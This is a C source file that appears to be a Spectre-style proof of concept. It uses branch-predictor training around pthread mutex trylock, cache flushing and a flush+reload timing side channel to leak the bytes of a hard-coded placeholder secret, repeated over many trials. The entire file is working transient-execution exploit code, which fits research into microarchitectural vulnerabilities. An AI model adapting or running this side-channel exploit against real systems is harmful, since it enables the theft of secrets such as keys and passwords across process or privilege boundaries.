#include <stdio.h>
#include <time.h>
#include <pthread.h>

#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define CACHE_HIT   100
#define N_PAGES     256

#define REPETITIONS 1000
#define N_TRAINING  10
#define SECRET_SIZE 9
#define SECRET      "mysecret"

#define false       0
#define true        1
#define DBG         0

#define FLAG PTHREAD_MUTEX_DEFAULT
//#define FLAG PTHREAD_MUTEX_ADAPTIVE_NP

cp_t* flush_reload_arr;

void attack_func(pthread_mutex_t* lock_ptr, int* lock_val_ptr, int secret_index) {
    if(pthread_mutex_trylock(lock_ptr) != 0) return;
    *lock_val_ptr = secret_index;
    pthread_mutex_unlock(lock_ptr);
    volatile cp_t cp = flush_reload_arr[SECRET[*lock_val_ptr]];
}

/*
 * Variables required in cache:
 *  lock0_var
 *  secret_index
 * Variables required in mem:
 *  lock0
 *
 * Training: lock_index=1   secret_index=0
 * Attack:   lock_index=0   secret_index={iterate through SECRET}
 */
void victim_func(int lock_index, int secret_index) {

    //creates 2 locks. put addresses in array to prevent branches (fools branch predictor).
    pthread_mutex_t lock0, lock1;
    pthread_mutex_init(&lock0, FLAG);
    pthread_mutex_init(&lock1, FLAG);
    int n_locks = 2;
    pthread_mutex_t* lock01_addresses[n_locks];
    lock01_addresses[0] = &lock0;
    lock01_addresses[1] = &lock1;
    int lock0_var, lock1_var;

    //lock either lock0 or lock1, depending on the parameter. Branch predictor cannot determine which (no branches).
    pthread_mutex_t* lock0or1_address = lock01_addresses[lock_index];
    pthread_mutex_lock(lock0or1_address);
    lock0_var = 0;

    //Remove lock0 from cache, so that the branch will speculatively execute.
    cpuid();
    flush(&lock0);
    cpuid();

    attack_func(&lock0, &lock0_var, secret_index);

    cpuid();
    pthread_mutex_unlock(lock0or1_address);
    pthread_mutex_destroy(&lock0);
    pthread_mutex_destroy(&lock1);
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr(flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING + 1;
    char lock_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        lock_indices[i] = 1;
        secret_indices[i] = 0;
    }
    lock_indices[n_accesses-1] = 0;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        victim_func(lock_indices[i], secret_indices[i]);
        cpuid();
        if(i < n_accesses-1) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT);
    free_flush_reload(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    clock_t start2 = clock();

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    clock_t end2 = clock();
    double measured_time = ((double)(end2 - start2))/CLOCKS_PER_SEC;

    print_results(results, REPETITIONS, SECRET, SECRET_SIZE, N_PAGES, CACHE_HIT, measured_time);

    free_results(results, REPETITIONS, SECRET_SIZE);
}